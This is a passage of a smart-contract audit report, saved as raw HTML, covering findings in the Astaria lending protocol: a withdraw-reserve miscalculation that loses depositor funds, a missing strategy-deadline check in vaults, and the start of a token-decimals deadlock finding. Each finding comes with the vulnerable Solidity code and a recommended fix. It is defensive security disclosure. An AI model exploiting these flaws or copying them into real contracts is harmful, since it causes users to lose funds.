WithdrawProxy(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.epochData[s.currentEpoch].withdrawProxy</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // split funds from previous WithdrawProxy with PublicVault if hasn&#39;t been already</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (s.currentEpoch != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      WithdrawProxy previousWithdrawProxy = WithdrawProxy(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s.epochData[s.currentEpoch - 1].withdrawProxy</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address(previousWithdrawProxy) != address(0) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        previousWithdrawProxy.getFinalAuctionEnd() != 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        previousWithdrawProxy.claim();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (s.epochData[s.currentEpoch].liensOpenForEpoch &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // reset liquidationWithdrawRatio to prepare for re calcualtion</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    s.liquidationWithdrawRatio = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check if there are LPs withdrawing this epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if ((address(currentWithdrawProxy) != address(0))) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 proxySupply = currentWithdrawProxy.totalSupply();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.liquidationWithdrawRatio = proxySupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .mulDivDown(1e18, totalSupply())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .safeCastTo88();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 expected = currentWithdrawProxy.getExpected();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (totalAssets() &gt; expected) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          s.withdrawReserve = (totalAssets() - expected)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            .mulWadDown(s.liquidationWithdrawRatio)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            .safeCastTo88();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          s.withdrawReserve = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _setYIntercept(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s.yIntercept -</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // burn the tokens of the LPs withdrawing</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _burn(address(this), proxySupply);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // increment epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.currentEpoch++;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p><code>s.liquidationWithdrawRatio</code> depends on how many shares exists inside WithdrawProxy. In case if amount of shares inside <code>WithdrawProxy</code> equal to amount of shares inside <code>PublicVault</code> that means that withdraw ratio is 100% and all funds from Vault should be sent to <code>WithdrawProxy</code>.</p>\n<p>In case if auction is in progress then <code>WithdrawProxy.getExpected</code> is not 0 and some amount of funds is expected from auction.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span></code></pre>\n<p>This is <code>s.withdrawReserve</code> calculation. As you can see in case if <code>totalAssets() &#x3C;= expected</code> then <code>s.withdrawReserve</code> is set to 0 and no funds will be sent to proxy. This is incorrect though.</p>\n<p>For example in the case when withdraw ratio is 100% all funds should be sent to the withdraw proxy, but because of that check, some part of funds will be still inside the vault and depositors will lose their funds. If for example totalAssets is 5eth and expected is 5 eth, then depositors will lose all 5 eth.</p>\n<p>This check is done in such way, because of <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/WithdrawProxy.sol#L258-L266\">calculations inside <code>WithdrawProxy</code></a>. But it’s not correct.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You need to check this logic again. Maybe you need to always send <code>s.withdrawReserve = totalAssets().mulWadDown(s.liquidationWithdrawRatio).safeCastTo88()</code> amount to the withdraw proxy. But then you need to rethink, how WithdrawProxy will handle yIntercept increase/decrease.</p>\n<hr>\n<h2 id=\"h-19-vaults-dont-verify-that-a-strategys-deadline-has-passed\" style=\"position:relative;\"><a href=\"#h-19-vaults-dont-verify-that-a-strategys-deadline-has-passed\" aria-label=\"h 19 vaults dont verify that a strategys deadline has passed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/122\">[H-19] Vaults don’t verify that a strategy’s deadline has passed</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/122\">Ruhum</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L229-L266\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L229-L266</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L439\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L439</a></p>\n<p>The vault doesn’t verify that a deadline hasn’t passed when a commitment is validated. Users are able to take out loans using strategies that have already expired. Depending on the nature of the strategy that can cause a loss of funds for the LPs.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When you take out a loan using the AstariaRouter, the deadline is verified:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateCommitment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToSecondEpochEnd</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILienToken.Lien </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lien</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCommitmentState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CommitmentState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">EXPIRED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// ...</span></span></span></code></pre>\n<p>But, <code>VaultImplementation._validateCommitment()</code> skips that check:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateCommitment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CT</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getApproved</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      !</span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">holder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUTHORITY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VIData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadVISlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ecrecover</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_encodeStrategyData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">merkle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">root</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">v</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">r</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">() &amp;&amp; </span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IVaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_SIGNATURE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>If you search for <code>deadline</code> in the codebase you’ll see that there’s no other place where the property is accessed.</p>\n<p>As long as the user takes out the loan from the vault directly, they can use strategies that have expired. The vault owner could prevent this from happening by incrementing the <code>strategistNonce</code> after the strategy expired.</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In <code>VaultImplementation._validateCommitment()</code> check that <code>deadline > block.timestamp</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/122\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-20-deadlock-in-vaults-with-underlying-token-with-less-then-18-decimals\" style=\"position:relative;\"><a href=\"#h-20-deadlock-in-vaults-with-underlying-token-with-less-then-18-decimals\" aria-label=\"h 20 deadlock in vaults with underlying token with less then 18 decimals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/72\">[H-20] Deadlock in vaults with underlying token with less then 18 decimals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/72\">Tointer</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/609\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/500\">gz627</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/482\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/294\">obront</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/190\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/155\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/115\">chaduke</a></em></p>\n<p>If underlying token 